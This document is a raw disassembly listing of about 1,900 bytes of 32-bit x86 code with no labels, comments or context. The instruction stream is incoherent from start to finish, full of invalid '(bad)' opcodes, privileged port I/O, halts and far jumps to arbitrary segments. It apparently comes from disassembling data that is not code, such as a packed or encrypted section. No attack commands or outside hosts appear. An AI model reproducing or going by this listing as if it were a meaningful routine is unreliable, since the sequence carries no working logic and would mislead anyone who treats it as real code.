  41681c:	mov    bl,0xd2
  41681e:	sbb    edi,DWORD PTR [ecx-0x242a83c6]
  416824:	shl    edx,1
  416826:	lea    ebp,[edx-0x3c7244ee]
  41682c:	jnp    0x41682d
  41682e:	pop    eax
  41682f:	ja     0x4167b1
  416831:	jnp    0x41686e
  416833:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  416834:	(bad)  
  416836:	add    BYTE PTR [eax+0x13],bh
  416839:	hlt    
  41683a:	out    0x3c,al
  41683c:	(bad)  
  41683d:	clc    
  41683e:	dec    ebx
  41683f:	push   es
  416840:	je     0x4168ba
  416842:	xchg   edi,eax
  416843:	mov    al,0x94
  416845:	sub    bl,BYTE PTR [ebx]
  416847:	fnsave [esi]
  416849:	mov    esp,0xe030c8ee
  41684e:	mov    cl,0x47
  416850:	cmp    al,0x94
  416852:	mov    al,ds:0xd4a1d38a
  416857:	in     eax,dx
  416858:	dec    esp
  416859:	int3   
  41685a:	jns    0x416803
  41685c:	xchg   ebx,eax
  41685d:	mov    eax,ds:0xc6b94806
  416862:	out    0x8a,al
  416864:	dec    esi
  416865:	mov    esi,0x43c4ac7a
  41686a:	arpl   WORD PTR [edi-0x3ca38e3d],sp
  416870:	jge    0x41686e
  416872:	jmp    FWORD PTR [esi]
  416874:	add    al,ah
  416876:	shl    bl,cl
  416878:	fcmovu st,st(1)
  41687a:	int3   
  41687b:	in     eax,dx
  41687c:	addr16 aas 
  41687e:	and    BYTE PTR [edx-0x23],0xb3
  416882:	cmp    edx,edx
  416884:	shr    DWORD PTR [esi],cl
  416886:	fcomp  QWORD PTR [ebp-0x57]
  416889:	push   es
  41688a:	dec    esp
  41688b:	cmp    ch,BYTE PTR [ebx+0x60c1d7ab]
  416891:	sahf   
  416892:	xchg   ebp,eax
  416893:	pop    ss
  416894:	lds    edi,FWORD PTR [ebx]
  416896:	fcmovnb st,st(4)
  416898:	or     esi,edi
  41689a:	in     al,dx
  41689b:	mov    ebx,ds
  41689d:	mov    ecx,0x6b3a91b6
  4168a2:	aad    0x96
  4168a4:	fiadd  WORD PTR [ebx]
  4168a6:	lea    esp,[ecx+0x1e8d6f72]
  4168ac:	stos   DWORD PTR es:[edi],eax
  4168ad:	add    eax,0x90de6c1e
  4168b2:	(bad)  
  4168b4:	pop    ds
  4168b5:	mov    ebp,0x3f9b11b1
  4168ba:	repnz shl DWORD PTR [edx],cl
  4168bd:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4168be:	ja     0x41684b
  4168c0:	inc    ebp
  4168c1:	in     al,0x93
  4168c3:	shr    ecx,1
  4168c5:	ret    
  4168c6:	pop    esp
  4168c7:	std    
  4168c8:	sahf   
  4168c9:	mov    WORD PTR [ebp+eiz*2-0x6f],cs
  4168cd:	or     eax,DWORD PTR [esi+eiz*4]
  4168d0:	jl     0x41688a
  4168d2:	test   BYTE PTR [ebx],al
  4168d4:	xor    DWORD PTR [ebp+0x304d0972],0x2f
  4168db:	dec    edx
  4168dc:	fsub   DWORD PTR [esi+edi*4]
  4168df:	inc    edi
  4168e0:	imul   edx,eax,0xa5d7b22e
  4168e6:	mov    bl,0x96
  4168e8:	dec    ebx
  4168e9:	jmp    0x4958:0x3d3f3270
  4168f0:	xchg   esp,eax
  4168f1:	popa   
  4168f2:	mov    esi,0x6a05baef
  4168f7:	dec    esp
  4168f8:	mov    dh,0xf0
  4168fa:	mov    dh,0xa7
  4168fc:	jl     0x416949
  4168fe:	xchg   DWORD PTR [eax-0x6e45382d],ebp
  416904:	ds jle 0x416934
  416907:	stc    
  416908:	(bad)
  41690c:	push   0xffffffe5
  41690e:	xor    DWORD PTR [ecx],0x37
  416911:	push   0x96497bdd
  416916:	int3   
  416917:	pop    ebx
  416918:	rcr    DWORD PTR [eax-0x4d2e0975],0x33
  41691f:	sbb    BYTE PTR [edi],0x2c
  416922:	in     al,dx
  416923:	sub    ebp,DWORD PTR [esi-0xcb85465]
  416929:	popf   
  41692a:	es mov eax,0x834acdf4
  416930:	(bad)  
  416932:	add    al,0xd4
  416934:	ss (bad) 
  416936:	das    
  416937:	in     eax,dx
  416938:	mov    ebx,0xcc9a1e63
  41693d:	stos   BYTE PTR es:[edi],al
  41693e:	stc    
  41693f:	nop
  416940:	xchg   ebx,eax
  416941:	add    eax,0xcb2f5e65
  416946:	movmskps ebp,xmm3
  416949:	les    esp,FWORD PTR [ebx+0x7b38ee77]
  41694f:	push   edi
  416950:	push   es
  416951:	popa   
  416952:	xchg   ecx,eax
  416953:	clc    
  416954:	add    esp,DWORD PTR [edx-0x4c011590]
  41695a:	pop    edx
  41695b:	or     al,0xc3
  41695d:	dec    ebp
  41695e:	inc    esi
  41695f:	xor    BYTE PTR [edx+0x245195e8],dh
  416965:	pop    edi
  416966:	lea    edx,[ecx]
  416968:	xor    al,0xda
  41696a:	out    0x57,eax
  41696c:	adc    al,BYTE PTR [edi]
  41696e:	jmp    0x5cbd0285
  416973:	pop    es
  416974:	inc    ecx
  416975:	mov    BYTE PTR [eax],cl
  416977:	in     al,dx
  416978:	pop    eax
  416979:	push   cs
  41697a:	mov    cl,al
  41697c:	imul   BYTE PTR [esi+0x290e35f9]
  416982:	dec    ecx
  416983:	cmp    ah,BYTE PTR [ebx]
  416985:	add    al,0x89
  416987:	out    0xfc,eax
  416989:	sub    DWORD PTR [edx+0x5ddb5803],ebx
  41698f:	aaa    
  416990:	std    
  416991:	stos   BYTE PTR es:[edi],al
  416992:	out    dx,al
  416993:	lds    esp,FWORD PTR [ebx+0x609ed15b]
  416999:	ror    BYTE PTR [edx-0x1d],cl
  41699c:	jle    0x4169b4
  41699e:	imul   esp,DWORD PTR [esi+0x66aa006b],0xffffffce
  4169a5:	xchg   edx,eax
  4169a6:	add    eax,0xb77b220b
  4169ab:	ins    DWORD PTR es:[edi],dx
  4169ac:	push   ss
  4169ad:	stos   DWORD PTR es:[edi],eax
  4169ae:	mov    edx,0xfe4880e4
  4169b3:	out    dx,al
  4169b4:	test   al,0x24
  4169b6:	scas   eax,DWORD PTR es:[edi]
  4169b7:	push   eax
  4169b8:	cmp    BYTE PTR [eax],0xe3
  4169bb:	xor    bl,dl
  4169bd:	jns    0x41697e
  4169bf:	push   cs
  4169c0:	lods   eax,DWORD PTR ds:[si]
  4169c2:	adc    al,bl
  4169c4:	inc    eax
  4169c5:	clc    
  4169c6:	dec    ebp
  4169c7:	nop
  4169c8:	jmp    0x4169ab
  4169ca:	push   edx
  4169cb:	std    
  4169cc:	fsubp  st(6),st
  4169ce:	adc    DWORD PTR ds:0x8208e0c,0xa6d5014d
  4169d8:	jae    0x416a10
  4169da:	(bad)  
  4169db:	xchg   ebp,eax
  4169dc:	ins    BYTE PTR es:[edi],dx
  4169dd:	xor    al,0x33
  4169df:	xchg   edx,eax
  4169e0:	std    
  4169e1:	(bad)  
  4169e2:	jge    0x416a53
  4169e4:	lds    esi,FWORD PTR [eax]
  4169e6:	dec    edi
  4169e7:	je     0x416979
  4169e9:	push   ebp
  4169ea:	jne    0x416a15
  4169ec:	lock scas al,BYTE PTR es:[edi]
  4169ee:	dec    esi
  4169ef:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4169f0:	pop    esi
  4169f1:	and    DWORD PTR [eax],esp
  4169f3:	daa    
  4169f4:	xchg   DWORD PTR [edx+0x6237f774],esp
  4169fa:	in     al,dx
  4169fb:	nop
  4169fc:	aam    0x17
  4169fe:	push   ecx
  4169ff:	cmp    eax,DWORD PTR [ebx-0x74]
  416a02:	mov    edi,eax
  416a04:	push   ds
  416a05:	push   0x48
  416a07:	and    BYTE PTR [ebx-0xad5205d],al
  416a0d:	ror    BYTE PTR [esi+0xb],1
  416a10:	dec    ecx
  416a11:	ror    eax,0x33
  416a14:	aaa    
  416a15:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  416a16:	sub    eax,0x8c0805f5
  416a1b:	not    BYTE PTR [edi-0x783475a0]
  416a21:	fbld   TBYTE PTR [edx+esi*2+0x3508a3da]
  416a28:	es popf 
  416a2a:	fwait
  416a2b:	(bad)  
  416a2c:	jp     0x4169c8
  416a2e:	adc    al,0xb
  416a30:	mov    eax,ds:0xc34738b6
  416a35:	lods   al,BYTE PTR ds:[esi]
  416a36:	and    eax,0x4f31dd15
  416a3b:	inc    ebp
  416a3c:	xor    ecx,DWORD PTR [esi]
  416a3e:	mov    ch,0x2
  416a40:	aad    0x40
  416a42:	xor    ecx,DWORD PTR [ebp+esi*1-0x5d]
  416a46:	test   DWORD PTR ds:0x6af668e5,eax
  416a4d:	xchg   ecx,eax
  416a4e:	mov    ds:0xa327e17e,eax
  416a53:	ror    BYTE PTR [edi-0x6190dce2],cl
  416a59:	je     0x416a07
  416a5b:	sbb    dh,BYTE PTR [ecx]
  416a5d:	pop    ecx
  416a5e:	ja     0x416ad6
  416a60:	(bad)  
  416a61:	int3   
  416a62:	fmul   QWORD PTR [esp+eax*2-0x58b9eacb]
  416a69:	pop    esp
  416a6a:	push   ss
  416a6b:	xor    al,0x93
  416a6d:	jmp    0x7e17f065
  416a72:	repnz mov eax,ds:0xe6256d94
  416a78:	int3   
  416a79:	sub    bh,BYTE PTR [eax-0x696c5a53]
  416a7f:	test   eax,0xbc79dc24
  416a84:	add    DWORD PTR [eax],ebp
  416a86:	inc    BYTE PTR [esi-0x4d]
  416a89:	add    al,0xce
  416a8b:	popa   
  416a8c:	scas   eax,DWORD PTR es:[edi]
  416a8d:	sbb    eax,0xd855be12
  416a92:	dec    ebp
  416a93:	imul   edi,edx,0x5
  416a96:	inc    eax
  416a97:	je     0x416b0c
  416a99:	ins    BYTE PTR es:[edi],dx
  416a9a:	(bad)  
  416a9b:	adc    esp,DWORD PTR [edi]
  416a9d:	sbb    ch,BYTE PTR [eax+0x2]
  416aa0:	sub    eax,0x4436598a
  416aa5:	and    eax,0xa3602994
  416aaa:	int3   
  416aab:	jo     0x416a53
  416aad:	retf   
  416aae:	sar    BYTE PTR cs:[ebp+edx*2+0x58594708],1
  416ab6:	js     0x416ac0
  416ab8:	xchg   ebx,ecx
  416aba:	fisubr WORD PTR [edi]
  416abc:	pop    eax
  416abd:	ss or  edx,eax
  416ac0:	aad    0x43
  416ac2:	es jp  0x416afb
  416ac5:	mov    bh,0xab
  416ac7:	jae    0x416a93
  416ac9:	enter  0xbbf1,0x2b
  416acd:	arpl   di,cx
  416acf:	(bad)  
  416ad1:	fwait
  416ad2:	call   0x6770:0xb2654517
  416ad9:	test   edi,ebp
  416adb:	xor    edx,DWORD PTR [edx]
  416add:	jmp    0xfb2e:0x2713d03c
  416ae4:	fs in  eax,dx
  416ae6:	fmulp  st(6),st
  416ae8:	mov    ah,0xf6
  416aea:	test   al,0x3e
  416aec:	inc    esp
  416aed:	neg    BYTE PTR [esi]
  416aef:	mov    ch,0xf6
  416af1:	push   ss
  416af2:	pop    ds
  416af3:	das    
  416af4:	pop    ebp
  416af5:	mov    esp,DWORD PTR [edi]
  416af7:	mov    dh,0x41
  416af9:	fdiv   st,st(5)
  416afb:	(bad)  
  416afc:	iret   
  416afd:	rcr    ebp,cl
  416aff:	and    eax,0x1f2fd9f5
  416b04:	std    
  416b05:	xor    al,bl
  416b07:	out    dx,eax
  416b08:	dec    esp
  416b09:	into   
  416b0a:	mov    eax,ds:0x821aa1a6
  416b0f:	out    0xca,al
  416b11:	inc    esp
  416b12:	call   0x4c3644d3
  416b17:	mov    al,ds:0x73bcbbea
  416b1c:	push   0xffffff89
  416b1e:	clc    
  416b1f:	sub    ah,BYTE PTR [ebx]
  416b21:	sub    ebx,edx
  416b23:	les    ecx,FWORD PTR [ebx]
  416b25:	ret    0xaaa
  416b28:	ror    BYTE PTR [eax-0x101904b3],cl
  416b2e:	sbb    ch,BYTE PTR [edx+0x6ab0b95c]
  416b34:	paddw  mm0,QWORD PTR [esi]
  416b37:	popf   
  416b38:	les    ebx,FWORD PTR [eax-0x2d]
  416b3b:	jnp    0x416b85
  416b3d:	xor    al,0xd4
  416b3f:	icebp  
  416b40:	mov    ds:0x6fac43f5,eax
  416b45:	adc    BYTE PTR ds:0xcde9283c,ah
  416b4b:	leave  
  416b4c:	dec    edx
  416b4d:	fidiv  DWORD PTR [edi+0x30614d24]
  416b53:	cs inc esp
  416b55:	imul   ebp,DWORD PTR [ebp+0x4b158312],0x9e8a6991
  416b5f:	aam    0x7
  416b61:	les    esp,FWORD PTR [eax+0x33]
  416b64:	pusha  
  416b65:	lock mov ds:0x416ccb1e,eax
  416b6b:	test   eax,0x9883d2fa
  416b70:	adc    esp,esp
  416b72:	mov    esp,0x91aa46ce
  416b77:	dec    ebx
  416b78:	sbb    bh,cl
  416b7a:	shl    DWORD PTR cs:[eax-0x5083c764],0x70
  416b82:	jmp    0x683e05a0
  416b87:	cmp    eax,0x41d75de2
  416b8c:	jns    0x416b85
  416b8e:	and    al,0x17
  416b90:	mov    edx,0x7b926ecd
  416b95:	sub    eax,0x82670f89
  416b9a:	pop    edi
  416b9b:	or     DWORD PTR [esp+esi*8-0x2af16259],esi
  416ba2:	sahf   
  416ba3:	pop    ds
  416ba4:	loope  0x416b7e
  416ba6:	adc    eax,0x8781837d
  416bab:	mov    ?,WORD PTR [edi]
  416bad:	retf   0x9f72
  416bb0:	sub    eax,0x7eb69267
  416bb5:	pusha  
  416bb6:	sbb    eax,0xee0b12c
  416bbb:	psadbw mm5,QWORD PTR [ebp-0x3a984f81]
  416bc2:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  416bc3:	ins    DWORD PTR es:[edi],dx
  416bc4:	and    BYTE PTR [eax],ch
  416bc6:	pop    ss
  416bc7:	sub    al,dl
  416bc9:	(bad)  
  416bca:	in     eax,0x5b
  416bcc:	pop    edi
  416bcd:	ret    
  416bce:	xchg   edi,eax
  416bcf:	jns    0x416c24
  416bd1:	or     DWORD PTR [edx+0x501323e4],edi
  416bd7:	in     eax,0x7b
  416bd9:	and    DWORD PTR [ebx],0xffffffae
  416bdc:	sub    eax,0x25470229
  416be1:	xor    dl,BYTE PTR [ecx+ebx*8+0x3545cb15]
  416be8:	out    0x91,ax
  416beb:	push   eax
  416bec:	jl     0x416c01
  416bee:	sbb    eax,0xf6a8d8c0
  416bf3:	js     0x416bdd
  416bf5:	or     dh,BYTE PTR [ebp+0x6f]
  416bf8:	fyl2xp1 
  416bfa:	push   ecx
  416bfb:	in     al,dx
  416bfc:	cmc    
  416bfd:	clc    
  416bfe:	fisttp QWORD PTR [edi-0x4]
  416c01:	popf   
  416c02:	xor    edx,DWORD PTR [edx+0x6]
  416c05:	jae    0x416ba3
  416c07:	stos   DWORD PTR es:[edi],eax
  416c08:	add    BYTE PTR [ebx+0x53],bl
  416c0b:	int    0xb6
  416c0d:	(bad)  
  416c0e:	aas    
  416c0f:	es jge 0x416c1f
  416c12:	fsubr  DWORD PTR [edi-0x6b]
  416c15:	imul   eax,DWORD PTR [ebx-0x4697b06b],0x5
  416c1c:	add    BYTE PTR [ecx-0x24c4681c],dh
  416c22:	dec    esi
  416c23:	mov    ds:0xdb8b58d5,al
  416c28:	in     al,0xe9
  416c2a:	xor    dl,bl
  416c2c:	test   al,0x1f
  416c2e:	pop    ebp
  416c2f:	loope  0x416c23
  416c31:	cmp    al,0x4c
  416c33:	xorps  xmm1,XMMWORD PTR [eax+0x4c]
  416c37:	retf   
  416c38:	sar    ebx,0x79
  416c3b:	pop    ebx
  416c3c:	fidiv  WORD PTR [ebp-0x3f]
  416c3f:	fsubrp st(3),st
  416c41:	jle    0x416c3c
  416c43:	outs   dx,BYTE PTR ds:[esi]
  416c44:	xchg   DWORD PTR [esi+0x3053f858],eax
  416c4a:	jno    0x416c82
  416c4c:	in     eax,dx
  416c4d:	ins    DWORD PTR es:[edi],dx
  416c4e:	xchg   ebx,eax
  416c4f:	pop    ss
  416c50:	jo     0x416bef
  416c52:	xor    ebp,DWORD PTR [esi+0x658417ec]
  416c58:	into   
  416c59:	adc    DWORD PTR [edi],edx
  416c5b:	sub    BYTE PTR ss:[ecx-0x6de6aa56],0x21
  416c63:	pop    ss
  416c64:	lods   al,BYTE PTR ds:[esi]
  416c65:	and    eax,0x9c32b618
  416c6a:	xor    DWORD PTR [ebx],ebp
  416c6c:	jb     0x416c2d
  416c6e:	sbb    eax,0x919eea4d
  416c73:	inc    edx
  416c74:	lods   eax,DWORD PTR ds:[esi]
  416c75:	jmp    0x416bfd
  416c77:	xchg   esi,eax
  416c78:	jecxz  0x416cef
  416c7a:	lock arpl WORD PTR ds:0x14a7e4f4,si
  416c81:	loope  0x416cc7
  416c83:	mov    dh,0x87
  416c85:	aam    0xcb
  416c87:	and    eax,0xc0d8c78f
  416c8c:	je     0x416c38
  416c8e:	outs   dx,DWORD PTR ds:[esi]
  416c8f:	mov    ebx,?
  416c91:	mov    esi,esp
  416c93:	push   ebp
  416c94:	lods   eax,DWORD PTR ds:[esi]
  416c95:	(bad)  
  416c96:	or     eax,0xa0e71fc6
  416c9b:	xchg   DWORD PTR [esp+esi*8+0xa87c4ec],edi
  416ca2:	in     al,0x31
  416ca4:	mov    bh,0xa4
  416ca6:	test   eax,0xcc67877a
  416cab:	jmp    0xed8d:0x309cadba
  416cb2:	xor    DWORD PTR gs:[ebp+0xdac2279],ebp
  416cb9:	or     bh,BYTE PTR [eax-0x48852936]
  416cbf:	cmp    eax,0xe0b6eb0d
  416cc4:	ret    0xf85f
  416cc7:	push   es
  416cc8:	rol    BYTE PTR [edi+0x4],1
  416ccb:	outs   dx,BYTE PTR ds:[esi]
  416ccc:	xchg   edx,eax
  416ccd:	int    0xe6
  416ccf:	inc    ebx
  416cd0:	js     0x416ccc
  416cd2:	in     al,0x10
  416cd4:	sbb    eax,0xa430613d
  416cd9:	sar    BYTE PTR [esi+0x55254bb5],0x7
  416ce0:	adc    al,0xd5
  416ce2:	ror    cl,cl
  416ce4:	loope  0x416d4a
  416ce6:	jg     0x416c7b
  416ce8:	sub    DWORD PTR [edi+ebp*4-0x39],edx
  416cec:	sub    BYTE PTR [ecx],ah
  416cee:	adc    BYTE PTR [edx],bh
  416cf0:	jecxz  0x416cfc
  416cf2:	or     eax,0xc9812fed
  416cf7:	mov    ch,0x45
  416cf9:	aad    0x22
  416cfb:	cmp    ecx,esi
  416cfd:	test   eax,0x9b027066
  416d02:	mov    ah,0xc8
  416d04:	jne    0x416d70
  416d06:	iret   
  416d07:	iret   
  416d08:	das    
  416d09:	push   ss
  416d0a:	or     ecx,DWORD PTR [edi-0x3803f110]
  416d10:	cmp    DWORD PTR [esi-0x31],0xffffff88
  416d14:	push   cs
  416d15:	or     dh,BYTE PTR [eax+esi*4-0x4daa916a]
  416d1c:	xor    BYTE PTR ss:[ecx+0x4c],ah
  416d20:	jnp    0x416d49
  416d22:	stc    
  416d23:	dec    eax
  416d24:	je     0x416d06
  416d26:	jae    0x416d58
  416d28:	sti    
  416d29:	icebp  
  416d2a:	cmp    DWORD PTR [esi-0x32c3e5ea],esp
  416d30:	out    dx,eax
  416d31:	inc    edi
  416d32:	xor    al,BYTE PTR [ebp+0x43]
  416d35:	jecxz  0x416d1c
  416d37:	aaa    
  416d38:	out    dx,eax
  416d39:	or     al,BYTE PTR [edx-0x3c35e57b]
  416d3f:	mov    esp,0xd7badb38
  416d44:	cmp    esi,DWORD PTR [ebx-0x4e]
  416d47:	push   esp
  416d48:	and    eax,0x4744e8f9
  416d4d:	pushf  
  416d4e:	lods   eax,DWORD PTR ds:[esi]
  416d4f:	rcr    BYTE PTR [ebx-0x48163433],0x44
  416d56:	mov    edx,0xaaff176b
  416d5b:	jl     0x416d61
  416d5d:	dec    edi
  416d5e:	pop    edx
  416d5f:	jae    0x416da3
  416d61:	cmp    DWORD PTR [ebx],edi
  416d63:	xor    ch,al
  416d65:	mov    BYTE PTR [ebx-0x46],bh
  416d68:	jg     0x416d67
  416d6a:	jmp    0x29526eb6
  416d6f:	mov    ecx,0x25156dce
  416d74:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  416d75:	mov    ch,0x52
  416d77:	vcmpps ymm5,ymm4,YMMWORD PTR [ecx+edx*4-0x30],0xfe
  416d7e:	push   edx
  416d7f:	push   0xfb4c3ad3
  416d84:	and    eax,0x91a1f9ee
  416d89:	jo     0x416d5a
  416d8b:	loope  0x416dc0
  416d8d:	cmp    ebx,edi
  416d8f:	test   BYTE PTR [edx-0x5],dh
  416d92:	and    bl,cl
  416d94:	out    0x82,al
  416d96:	add    al,0x8b
  416d98:	mov    ch,ch
  416d9a:	mov    eax,ds:0x9003d125
  416d9f:	adc    DWORD PTR [esi+0x6b51e693],esp
  416da5:	fwait
  416da6:	xchg   ecx,eax
  416da7:	ret    
  416da8:	dec    ebx
  416da9:	dec    ebp
  416daa:	sub    ecx,DWORD PTR [edi+0x55c52e40]
  416db0:	jle    0x416d52
  416db2:	mov    dl,0xa7
  416db4:	add    al,BYTE PTR [eax+0x6307327e]
  416dba:	xchg   edi,edx
  416dbc:	sbb    edx,DWORD PTR [edx]
  416dbe:	pop    edi
  416dbf:	dec    eax
  416dc0:	pop    eax
  416dc1:	push   edx
  416dc2:	push   esp
  416dc3:	add    bh,BYTE PTR [edx]
  416dc5:	dec    edx
  416dc6:	sub    bl,ah
  416dc8:	dec    ecx
  416dc9:	pop    ebp
  416dca:	add    al,0xac
  416dcc:	js     0x416e12
  416dce:	imul   ebp,DWORD PTR [edi+0x1],0xffffffcc
  416dd2:	and    ecx,DWORD PTR ds:0x7513c157
  416dd8:	dec    eax
  416dd9:	std    
  416dda:	cmp    cl,BYTE PTR [esi-0x5d1a06a8]
  416de0:	push   ss
  416de1:	add    al,cl
  416de3:	cwde   
  416de4:	seta   BYTE PTR [ebp-0x22]
  416de8:	das    
  416de9:	mov    ebx,DWORD PTR [ecx+esi*8]
  416dec:	sbb    DWORD PTR [eax-0x4c],esp
  416def:	popa   
  416df0:	or     eax,0xf2eae013
  416df5:	aaa    
  416df6:	(bad)  
  416df8:	shl    BYTE PTR [esi],1
  416dfa:	xor    dl,BYTE PTR [edx+0x35db9338]
  416e00:	loopne 0x416de4
  416e02:	repz ret 
  416e04:	lock sub al,0xfe
  416e07:	mov    DWORD PTR [ebx+0x59],edx
  416e0a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  416e0b:	cwde   
  416e0c:	xor    DWORD PTR [ebx+edi*1],0x18349291
  416e13:	enter  0xf07e,0xe
  416e17:	(bad)  
  416e18:	mov    edx,0x2da3a247
  416e1d:	dec    ebp
  416e1e:	lds    ebp,FWORD PTR [edx+0x5ce193be]
  416e24:	pop    esp
  416e25:	shl    BYTE PTR [edi+0x52],cl
  416e28:	cdq    
  416e29:	pop    es
  416e2a:	add    bl,BYTE PTR [eax+0x7d]
  416e2d:	sub    esp,ebp
  416e2f:	inc    ebx
  416e30:	xor    eax,0x93114c5f
  416e36:	fadd   DWORD PTR [ebx]
  416e38:	mov    cl,0xc5
  416e3a:	mov    gs,WORD PTR [ecx+edi*8-0x5c]
  416e3e:	and    DWORD PTR [edi+0x1604aea3],eax
  416e44:	or     DWORD PTR [esi],edx
  416e46:	gs imul edx,eax,0x1ba64e54
  416e4d:	push   esi
  416e4e:	mov    WORD PTR [ebx-0x6e],ds
  416e51:	lods   eax,DWORD PTR ds:[esi]
  416e52:	call   0xcb31744f
  416e57:	cli    
  416e58:	in     al,dx
  416e59:	aaa    
  416e5a:	xor    cl,bl
  416e5c:	inc    edi
  416e5d:	sbb    al,0xf6
  416e5f:	push   0xddd41917
  416e64:	fstp   DWORD PTR ds:0x5dac88f6
  416e6a:	or     edx,eax
  416e6c:	add    edx,ebx
  416e6e:	scas   eax,DWORD PTR es:[edi]
  416e6f:	cdq    
  416e70:	push   ebx
  416e71:	pop    esi
  416e72:	xor    al,0x69
  416e74:	fcomp  DWORD PTR [edx+0x5f]
  416e77:	mov    ebp,0x148494db
  416e7c:	dec    ecx
  416e7d:	fs scas eax,DWORD PTR es:[edi]
  416e7f:	icebp  
  416e80:	aas    
  416e81:	cdq    
  416e82:	adc    eax,0x9070dc0c
  416e87:	fdivrp st(6),st
  416e8a:	sbb    bl,BYTE PTR [edx-0x54]
  416e8d:	add    edi,edi
  416e8f:	jbe    0x416e4c
  416e91:	loopne 0x416ee2
  416e93:	in     eax,dx
  416e94:	xchg   BYTE PTR [eax+0x2a],dh
  416e97:	outs   dx,BYTE PTR ds:[esi]
  416e98:	(bad)  
  416e9a:	push   ebp
  416e9b:	es mov esp,0x64fe7476
  416ea1:	dec    edx
  416ea2:	xchg   esi,eax
  416ea3:	pop    esp
  416ea4:	hlt    
  416ea5:	mov    ah,0xf6
  416ea7:	push   ebp
  416ea8:	and    bl,ah
  416eaa:	cmc    
  416eab:	push   esi
  416eac:	jbe    0x416eea
  416eae:	xchg   DWORD PTR [edi-0x3894e010],edi
  416eb4:	jo     0x416ea1
  416eb6:	push   ebp
  416eb7:	push   eax
  416eb8:	push   ds
  416eb9:	cmp    bh,BYTE PTR [edx-0x69]
  416ebc:	lock xchg ecx,eax
  416ebe:	int    0xe8
  416ec0:	mov    ds:0x6c7f0c7e,al
  416ec5:	int    0xf6
  416ec7:	mul    BYTE PTR [edx]
  416ec9:	jge    0x416eb1
  416ecb:	aaa    
  416ecc:	lahf   
  416ecd:	push   esi
  416ece:	and    eax,0x46dc85d2
  416ed3:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  416ed4:	inc    esp
  416ed5:	xchg   esp,eax
  416ed6:	mov    ah,0x5d
  416ed8:	sub    DWORD PTR [ebp+0x70],eax
  416edb:	xor    al,BYTE PTR [ecx+0x2f]
  416ede:	xchg   ecx,eax
  416edf:	sbb    DWORD PTR [edx],eax
  416ee1:	nop
  416ee2:	int    0xa8
  416ee4:	cmp    al,0xbb
  416ee6:	stc    
  416ee7:	jp     0x416f0b
  416ee9:	pop    esp
  416eea:	ret    0xf243
  416eed:	jmp    FWORD PTR [ebp-0x81e4e72]
  416ef3:	inc    ecx
  416ef5:	retf   0x3064
  416ef8:	mov    ds:0x47398b6b,eax
  416efd:	aam    0xd5
  416eff:	pop    ebx
  416f00:	test   BYTE PTR [edx-0x4c],ch
  416f03:	call   0xd3e7daf9
  416f08:	push   ds
  416f09:	pop    edi
  416f0a:	jns    0x416f25
  416f0c:	loop   0x416eb8
  416f0e:	test   eax,0xd2451d7
  416f13:	retf   
  416f14:	jp     0x416ef2
  416f16:	int    0x5f
  416f18:	jb     0x416efc
  416f1a:	pop    edx
  416f1b:	icebp  
  416f1c:	xlat   BYTE PTR ds:[ebx]
  416f1d:	pop    ecx
  416f1e:	retf   
  416f1f:	sub    eax,esi
  416f21:	je     0x416f5a
  416f23:	push   edi
  416f24:	adc    DWORD PTR [edi],ebp
  416f26:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  416f27:	lods   eax,DWORD PTR ds:[esi]
  416f28:	cdq    
  416f29:	lock repz sahf 
  416f2c:	fst    QWORD PTR [ecx+0x72604e1f]
  416f32:	std    
  416f33:	xor    edi,DWORD PTR [edx]
  416f35:	and    DWORD PTR [edi-0x7ec7b91c],eax
  416f3b:	ss push es
  416f3d:	mov    eax,ds:0x6973288a
  416f42:	adc    BYTE PTR [eax-0x4e],al
  416f45:	cs push es
  416f47:	lahf   
  416f48:	or     BYTE PTR [eax-0x4828b14c],dl
  416f4e:	mov    ah,0x85
  416f50:	rcl    ah,cl
  416f52:	add    ch,cl
  416f54:	out    dx,al
  416f55:	fld    DWORD PTR [edx]
  416f57:	mov    dh,0x5f
  416f59:	push   ds
  416f5a:	adc    ebx,DWORD PTR [eax+0x22]
  416f5d:	mov    ah,0xf9
  416f5f:	sbb    cl,BYTE PTR [ebp+0x53]
  416f62:	inc    ebp
  416f63:	inc    ebx
  416f64:	mov    ds:0x5d9afbe5,eax
  416f69:	iret   
  416f6a:	cmp    eax,0xb32935e1
  416f6f:	push   ds
  416f70:	and    al,0xa2
  416f72:	inc    ebp
  416f73:	push   ebp
  416f74:	push   edi
  416f75:	nop    DWORD PTR [edi]
  416f78:	lahf   
  416f79:	xchg   edx,eax
  416f7a:	fistp  QWORD PTR [ecx+0x3c7deb8b]
  416f80:	jns    0x416f50
  416f82:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  416f83:	call   FWORD PTR [esi+0x45bc45bc]
  416f89:	loop   0x416f97
  416f8b:	ret    
  416f8c:	and    ch,BYTE PTR [ecx+0x234ae9ac]
  416f92:	mov    dl,0x8a
  416f94:	xor    DWORD PTR [edi-0x2c724fdd],esi
  416f9a:	adc    al,0x1d
  416f9c:	lea    ebp,[ebp+0x7b]
  416f9f:	(bad)  
  416fa0:	lds    edx,FWORD PTR [eax]
  416fa2:	xchg   BYTE PTR [edx-0x67abb787],al
  416fa8:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  416fa9:	fwait
  416faa:	aas    
  416fab:	adc    eax,0x4fe29c3d
  416fb0:	std    
  416fb1:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  416fb2:	pusha  
  416fb3:	pop    ss
  416fb4:	fisttp QWORD PTR [esi+0x79]
  416fb7:	jno    0x417003
  416fb9:	imul   edx,DWORD PTR [ebp-0x6fba2469],0xffffffb5
  416fc0:	sub    al,0x96
  416fc2:	daa    
  416fc3:	out    dx,al
  416fc4:	sbb    ebp,DWORD PTR [edi-0x35bc8fb9]
  416fca:	sar    BYTE PTR [esi],cl
  416fcc:	or     BYTE PTR [edx-0x31003abc],ah
  416fd2:	jmp    0xf26c591b
  416fd7:	lock mov ch,0xfc
  416fda:	jp     0x416f6d
  416fdc:	mov    bl,0x82
  416fde:	xor    eax,0x4a39f822
  416fe3:	sub    eax,0xf5839c72
  416fe8:	das    
